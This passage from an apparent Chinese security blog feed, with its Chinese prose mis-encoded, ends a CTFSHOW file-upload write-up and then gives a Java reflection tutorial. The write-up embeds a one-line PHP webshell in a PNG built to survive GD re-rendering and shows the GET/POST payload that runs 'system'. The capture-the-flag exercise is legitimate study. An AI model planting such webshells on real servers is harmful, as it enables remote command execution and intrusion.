class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;2.png&#x27;</span>);  <span class="comment">//è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„</span></span><br><span class="line"><span class="comment">/* æœ¨é©¬å†…å®¹</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„å›¾ç‰‡ä¸Šä¼ ï¼Œè®¾ç½®å¥½å‚æ•°åï¼ŒæŠ“åŒ…</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/164_02.png" alt=""></p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/164_03.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸæ‰§è¡Œäº†ï¼Œæ„é€ Payload</p><p><strong>Payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: &amp;<span class="number">0</span>=system</span><br><span class="line">POST: <span class="number">1</span>=cat f*</span><br></pre></td></tr></table></figure><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/164_04.png" alt=""></p><h1 id="web165"><a href="#web165" class="headerlink" title="web165()"></a>web165()</h1><p>æŸ¥çœ‹æºä»£ç åï¼Œå‘ç°æœ¬é¢˜éœ€è¦çš„æ˜¯<code>.jpg</code>æ–‡ä»¶ï¼Œä¸Šä¼ ä¸€å¼ jpgå›¾ç‰‡æŠ“åŒ…</p><p><img src="/img/CTFSHOW-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/165.jpg" alt=""></p><p>å½“å­˜åœ¨<code>gd-jpeg v1.0 (using IJG JPEG v80), default quality</code>è¿™ä¸ªå­—ç¬¦ä¸²æ—¶ï¼Œåˆ™è¯´æ˜è¿›è¡Œäº†äºŒæ¬¡æ¸²æŸ“</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaåå°„</title>
      <link href="/2023/08/15/Java%E5%8F%8D%E5%B0%84/"/>
      <url>/2023/08/15/Java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="åå°„çš„æ¦‚è¿°"><a href="#åå°„çš„æ¦‚è¿°" class="headerlink" title="åå°„çš„æ¦‚è¿°"></a>åå°„çš„æ¦‚è¿°</h1><p>Javaåå°„æ˜¯åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»ï¼Œéƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼›å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•å’Œå±æ€§ï¼›è¿™ç§åŠ¨æ€è·å–çš„ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸ºjavaè¯­è¨€çš„åå°„æœºåˆ¶</p><p><strong>åå°„å°±æ˜¯æŠŠjavaç±»ä¸­çš„å„ç§æˆåˆ†æ˜ å°„æˆä¸€ä¸ªä¸ªçš„Javaå¯¹è±¡</strong></p><p><img src="/img/Java%E5%8F%8D%E5%B0%84/java.png" alt=""></p><h1 id="åå°„æœºåˆ¶æœ‰ä»€ä¹ˆç”¨ï¼Ÿ"><a href="#åå°„æœºåˆ¶æœ‰ä»€ä¹ˆç”¨ï¼Ÿ" class="headerlink" title="åå°„æœºåˆ¶æœ‰ä»€ä¹ˆç”¨ï¼Ÿ"></a>åå°„æœºåˆ¶æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</h1><ul><li>è¿è¡Œæ—¶åŠ¨æ€è·å–ç±»çš„ä¿¡æ¯ï¼šåœ¨ç¼–å†™ä»£ç æ—¶ï¼Œå¯¹äºç±»çš„ä¿¡æ¯æ˜¯å¿…é¡»åœ¨ç¼–è¯‘æ—¶ç¡®å®šçš„ï¼Œä½†åœ¨è¿è¡Œæ—¶ï¼Œæœ‰æ—¶éœ€è¦æ ¹æ®æŸäº›æ¡ä»¶ï¼ŒåŠ¨æ€è·å–æŸä¸ªç±»çš„ä¿¡æ¯ï¼Œè¿™æ—¶å°±å¯ä»¥ä½¿ç”¨Javaä¸­çš„åå°„æœºåˆ¶ã€‚</li><li>åŠ¨æ€ç”Ÿæˆå¯¹è±¡ï¼šåå°„æœºåˆ¶å¯ä»¥åœ¨è¿è¡Œæ—¶ç”Ÿæˆå¯¹è±¡ï¼Œè¿™æ ·å°±å¯ä»¥æ ¹æ®å‚æ•°çš„ä¸åŒï¼ŒåŠ¨æ€çš„åˆ›å»ºä¸åŒçš„ç±»çš„å®ä¾‹å¯¹è±¡ã€‚</li><li>åŠ¨æ€è°ƒç”¨æ–¹æ³•ï¼šé€šè¿‡åå°„æœºåˆ¶å¯ä»¥è°ƒç”¨ç±»ä¸­çš„æ–¹æ³•ï¼Œä¸è®ºè¿™äº›æ–¹æ³•æ˜¯å¦æ˜¯å…¬å…±çš„ï¼Œä¹Ÿä¸è®ºè¿™äº›æ–¹æ³•çš„å‚æ•°ä¸ªæ•°å’Œç±»å‹æ˜¯ä»€ä¹ˆï¼Œåå°„æœºåˆ¶éƒ½å…·æœ‰è¿™æ ·çš„èƒ½åŠ›ã€‚</li><li>åŠ¨æ€ä¿®æ”¹å±æ€§ï¼šåˆ©ç”¨åå°„æœºåˆ¶å¯ä»¥è·å–åˆ°ç±»ä¸­çš„æ‰€æœ‰æˆå‘˜å˜é‡ï¼Œå¹¶å¯ä»¥å¯¹å…¶è¿›è¡Œä¿®æ”¹ã€‚</li><li>å®ç°åŠ¨æ€ä»£ç†ï¼šåˆ©ç”¨åå°„æœºåˆ¶å¯ä»¥å®ç°ä»£ç†æ¨¡å¼ï¼Œé€šè¿‡ä»£ç†å¯¹è±¡å®ŒæˆåŸå¯¹è±¡å¯¹æŸäº›æ–¹æ³•çš„è°ƒç”¨ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥åœ¨è¿™äº›æ–¹æ³•çš„è°ƒç”¨å‰ååšä¸€äº›é¢å¤–çš„å¤„ç†ã€‚</li></ul><h1 id="åå°„ç›¸å…³çš„ç±»"><a href="#åå°„ç›¸å…³çš„ç±»" class="headerlink" title="åå°„ç›¸å…³çš„ç±»"></a>åå°„ç›¸å…³çš„ç±»</h1><div class="table-container"><table><thead><tr><th>ç±»</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>java.lang.Class</td><td>ä»£è¡¨æ•´ä¸ªå­—èŠ‚ç ã€‚ä»£è¡¨ä¸€ä¸ªç±»å‹ï¼Œä»£è¡¨æ•´ä¸ªç±»ã€‚</td></tr><tr><td>java.lang.reflect.Method</td><td>ä»£è¡¨å­—èŠ‚ç ä¸­çš„æ–¹æ³•å­—èŠ‚ç ã€‚ä»£è¡¨ç±»ä¸­çš„æ–¹æ³•ã€‚</td></tr><tr><td>java.lang.reflect.Constructor</td><td>ä»£è¡¨å­—èŠ‚ç ä¸­çš„æ„é€ æ–¹æ³•å­—èŠ‚ç ã€‚ä»£è¡¨ç±»ä¸­çš„æ„é€ æ–¹æ³•ã€‚</td></tr><tr><td>java.lang.reflect.Field</td><td>ä»£è¡¨å­—èŠ‚ç ä¸­çš„å±æ€§å­—èŠ‚ç ã€‚ä»£è¡¨ç±»ä¸­çš„æˆå‘˜å˜é‡(é™æ€å˜é‡+å®ä¾‹å˜é‡)ã€‚</td></tr></tbody></table></div><p><strong>æ³¨</strong>ï¼š<strong>å¿…é¡»å…ˆè·å¾—Classç±»æ‰èƒ½è·å–Methodã€Constructorã€Fieldã€‚</strong></p><h1 id="Classç±»"><a href="#Classç±»" class="headerlink" title="Classç±»"></a>Classç±»</h1><h2 id="è·å¾—ç±»ç›¸å…³çš„æ–¹æ³•"><a href="#è·å¾—ç±»ç›¸å…³çš„æ–¹æ³•" class="headerlink" title="è·å¾—ç±»ç›¸å…³çš„æ–¹æ³•"></a>è·å¾—ç±»ç›¸å…³çš„æ–¹æ³•</h2><div class="table-container"><table><thead><tr><th>æ–¹æ³•</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>asSubclass(Class<U> clazz)</td><td>æŠŠä¼ é€’çš„ç±»çš„å¯¹è±¡è½¬æ¢æˆä»£è¡¨å…¶å­ç±»çš„å¯¹è±¡</td></tr><tr><td>Cast</td><td>æŠŠå¯¹è±¡è½¬æ¢æˆä»£è¡¨ç±»æˆ–æ˜¯æ¥å£çš„å¯¹è±¡</td></tr><tr><td>getClassLoader()</td><td>è·å¾—ç±»çš„åŠ è½½å™¨</td></tr><tr><td>getClasses()</td><td>è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„ä¸­åŒ…å«è¯¥ç±»ä¸­æ‰€æœ‰å…¬å…±ç±»å’Œæ¥å£ç±»çš„å¯¹è±¡</td></tr><tr><td>getDeclaredClasses()</td><td>è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„ä¸­åŒ…å«è¯¥ç±»ä¸­æ‰€æœ‰ç±»å’Œæ¥å£ç±»çš„å¯¹è±¡</td></tr><tr><td>forName(String className)</td><td>æ ¹æ®ç±»åè¿”å›ç±»çš„å¯¹è±¡</td></tr><tr><td>getName()</td><td>è·å¾—ç±»çš„å®Œæ•´è·¯å¾„åå­—</td></tr><tr><td>newInstancen()</td><td>åˆ›å»ºç±»çš„å®ä¾‹</td></tr><tr><td>getPackage()</td><td>è·å¾—ç±»çš„åŒ…</td></tr><tr><td>getSimpleName()</td><td>è·å¾—ç±»çš„åå­—</td></tr><tr><td>getSuperclass()</td><td>è·å¾—å½“å‰ç±»ç»§æ‰¿çš„çˆ¶ç±»çš„åå­—</td></tr><tr><td>getInterfaces()</td><td>è·å¾—å½“å‰ç±»å®ç°çš„ç±»æˆ–æ˜¯æ¥å£</td></tr></tbody></table></div><h2 id="è·å¾—ç±»ä¸­å±æ€§ç›¸å…³çš„æ–¹æ³•"><a href="#è·å¾—ç±»ä¸­å±æ€§ç›¸å…³çš„æ–¹æ³•" class="headerlink" title="è·å¾—ç±»ä¸­å±æ€§ç›¸å…³çš„æ–¹æ³•"></a>è·å¾—ç±»ä¸­å±æ€§ç›¸å…³çš„æ–¹æ³•</h2><div class="table-container"><table><thead><tr><th>æ–¹æ³•</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>getField(String name)</td><td>è·å¾—æŸä¸ªå…¬æœ‰çš„å±æ€§å¯¹è±¡</td></tr><tr><td>getFields()</td><td>è·å¾—æ‰€æœ‰å…¬æœ‰çš„å±æ€§å¯¹è±¡</td></tr><tr><td>getDeclaredField(String name)</td><td>è·å¾—æŸä¸ªå±æ€§å¯¹è±¡</td></tr><tr><td>getDeclaredFields()</td><td>è·å¾—æ‰€æœ‰å±æ€§å¯¹è±¡</td></tr></tbody></table></div><h2 id="è·å¾—ç±»ä¸­æ„é€ å™¨ç›¸å…³çš„æ–¹æ³•"><a href="#è·å¾—ç±»ä¸­æ„é€ å™¨ç›¸å…³çš„æ–¹æ³•" class="headerlink" title="è·å¾—ç±»ä¸­æ„é€ å™¨ç›¸å…³çš„æ–¹æ³•"></a>è·å¾—ç±»ä¸­æ„é€ å™¨ç›¸å…³çš„æ–¹æ³•</h2><div class="table-container"><table><thead><tr><th>æ–¹æ³•</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>getConstructor(Classâ€¦&lt;?&gt; parameterTypes)</td><td>è·å¾—è¯¥ç±»ä¸­ä¸å‚æ•°ç±»å‹åŒ¹é…çš„å…¬æœ‰æ„é€ æ–¹æ³•</td></tr><tr><td>getConstructors()</td><td>è·å¾—è¯¥ç±»çš„æ‰€æœ‰å…¬æœ‰æ„é€ æ–¹æ³•</td></tr><tr><td>getDeclaredConstructor(Classâ€¦&lt;?&gt; parameterTypes)</td><td>è·å¾—è¯¥ç±»ä¸­ä¸å‚æ•°ç±»å‹åŒ¹é…çš„æ„é€ æ–¹æ³•</td></tr><tr><td>getDeclaredConstructors()</td><td>è·å¾—è¯¥ç±»æ‰€æœ‰æ„é€ æ–¹æ³•</td></tr></tbody></table></div><h2 id="è·å¾—ç±»ä¸­æ–¹æ³•ç›¸å…³çš„æ–¹æ³•"><a href="#è·å¾—ç±»ä¸­æ–¹æ³•ç›¸å…³çš„æ–¹æ³•" class="headerlink" title="è·å¾—ç±»ä¸­æ–¹æ³•ç›¸å…³çš„æ–¹æ³•"></a>è·å¾—ç±»ä¸­æ–¹æ³•ç›¸å…³çš„æ–¹æ³•</h2><div class="table-container"><table><thead><tr><th>æ–¹æ³•</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>getMethod(String name,Classâ€¦&lt;?&gt; parameterTypes)</td><td>è·å¾—è¯¥ç±»æŸä¸ªå…¬æœ‰çš„æ–¹æ³•</td></tr><tr><td>getMethods()</td><td>è·å¾—è¯¥ç±»æ‰€æœ‰å…¬æœ‰çš„æ–¹æ³•</td></tr><tr><td>getDeclaredMethod(String name.Classâ€¦&lt;?&gt; parameterTypes)</td><td>è·å¾—è¯¥ç±»æŸä¸ªæ–¹æ³•</td></tr><tr><td>getDeclaredMethods()</td><td>è·å¾—è¯¥ç±»æ‰€æœ‰æ–¹æ³•</td></tr></tbody></table></div><h1 id="åå°„è¯¦è§£"><a href="#åå°„è¯¦è§£" class="headerlink" title="åå°„è¯¦è§£"></a>åå°„è¯¦è§£</h1><p>ä»å®Œæ•´çš„çš„ä»£ç ï¼Œæ¥è°ƒç”¨ç±»æ„é€ æ–¹æ³•ï¼Œç±»æ–¹æ³•å’Œè·å–ç±»å±æ€§</p><p><strong>Personç±»</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person[name=&quot;</span> + name + <span class="string">&quot;, age=&quot;</span> + age + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">(String act)</span>&#123;</span><br><span class="line">        System.out.println(act);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">(String act)</span>&#123;</span><br><span class="line">        System.out.println(act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ReflectionTestç±»</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        Class c=person.getClass();</span><br><span class="line">        <span class="comment">// åå°„å°±æ˜¯æ“ä½œClass</span></span><br><span class="line">        <span class="comment">// Classæ˜¯classçš„æŠ½è±¡ï¼Œclassæ˜¯Classçš„å®ä¾‹</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//ä»åŸå‹classé‡Œé¢å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">        <span class="comment">//c.newInstance();  //æ— å‚æ„é€ æ–¹æ³•</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">personconstructor</span> <span class="operator">=</span> c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personconstructor.newInstance(<span class="string">&quot;SpongeBob&quot;</span>,<span class="number">19</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//è·å–ç±»é‡Œé¢å±æ€§</span></span><br><span class="line">        Field[] public_personfields = c.getFields();<span class="comment">//è·å–å…¬æœ‰çš„å±æ€§</span></span><br><span class="line">        <span class="keyword">for</span>(Field f:public_personfields)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">        Field[] private_personfields = c.getDeclaredFields();<span class="comment">//è·å–ç§æœ‰å’Œå…¬æœ‰çš„å±æ€§</span></span><br><span class="line">        <span class="keyword">for</span>(Field f:private_personfields)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> c.getField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        namefield.set(p,<span class="string">&quot;Patrick&quot;</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">agefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        agefield.setAccessible(<span class="literal">true</span>);<span class="comment">//å…è®¸è®¿é—®ç§æœ‰çš„å±æ€§</span></span><br><span class="line">        agefield.set(p,<span class="number">20</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//è°ƒç”¨ç±»é‡Œé¢çš„æ–¹æ³•</span></span><br><span class="line">        Method[] personmethods = c.getMethods();</span><br><span class="line">        <span class="keyword">for</span>(Method m:personmethods)&#123;</span><br><span class="line">            System.out.println(m);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">showmethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;show&quot;</span>,String.class);</span><br><span class="line">        showmethod.invoke(p,<span class="string">&quot;SpongeBob&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">displaymethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;display&quot;</span>, String.class);</span><br><span class="line">        displaymethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        displaymethod.invoke(p,<span class="string">&quot;SpongeBob&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è°ƒç”¨ç±»æ„é€ æ–¹æ³•"><a href="#è°ƒç”¨ç±»æ„é€ æ–¹æ³•" class="headerlink" title="è°ƒç”¨ç±»æ„é€ æ–¹æ³•"></a>è°ƒç”¨ç±»æ„é€ æ–¹æ³•</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c.newInstance();<span class="comment">// æ— å‚æ„é€ æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">personconstructor</span> <span class="operator">=</span> c.getConstructor(String.class,<span class="type">int</span>.class);</span><br><span class="line"><span class="comment">// c.getConstructor//è·å–ç±»é‡Œé¢çš„æ„é€ æ–¹æ³•ï¼Œä¸åŒçš„å‚æ•°ä¼šè°ƒç”¨ä¸åŒçš„æ„é€ æ–¹æ³•ï¼Œé»˜è®¤æ— å‚</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personconstructor.newInstance(<span class="string">&quot;SpongeBob&quot;</span>,<span class="number">19</span>);</span><br><span class="line">System.out.println(p);</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºç»“æœ</strong></p><p><img src="/img/Java%E5%8F%8D%E5%B0%84/java_01.png" alt=""></p><h2 id="è·å–ç±»æ–¹æ³•"><a href="#è·å–ç±»æ–¹æ³•" class="headerlink" title="è·å–ç±»æ–¹æ³•"></a>è·å–ç±»æ–¹æ³•</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Method[] personmethods = c.getMethods();</span><br><span class="line"><span class="keyword">for</span>(Method m:personmethods)&#123;</span><br><span class="line">    System.out.println(m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºç»“æœ</strong></p><p><img src="/img/Java%E5%8F%8D%E5%B0%84/java_05.png" alt=""></p><p>ä¹Ÿå¯ä»¥æ ¹æ®æ–¹æ³•åè·å–æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è·å–å…¬æœ‰å±æ€§çš„æ–¹æ³•</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">showmethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;show&quot;</span>,String.class);</span><br><span class="line"><span class="comment">// ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè°ƒç”¨çš„æ–¹æ³•åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæ–¹æ³•çš„ç±»å‹</span></span><br><span class="line">showmethod.invoke(p,<span class="string">&quot;SpongeBob&quot;</span>);</span><br><span class="line"><span class="comment">// invokeï¼šåå°„åŠ¨æ€è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•</span></span><br><span class="line"><span class="comment">// ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç±»çš„å®ä¾‹ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºæ–¹æ³•çš„å‚æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–å…¬æœ‰å’Œç§æœ‰å±æ€§çš„æ–¹æ³•</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">displaymethod</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;display&quot;</span>, String.class);</span><br><span class="line">displaymethod.setAccessible(<span class="literal">true</span>);<span class="comment">// å…è®¸è®¿é—®ç§æœ‰çš„å±æ€§</span></span><br><span class="line">displaymethod.invoke(p,<span class="string">&quot;SpongeBob&quot;</span>);</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºç»“æœ</strong></p><p><img src="/img/Java%E5%8F%8D%E5%B0%84/java_06.png" alt=""></p><h2 id="è·å–ç±»å±æ€§"><a href="#è·å–ç±»å±æ€§" class="headerlink" title="è·å–ç±»å±æ€§"></a>è·å–ç±»å±æ€§</h2><figure class="highlight 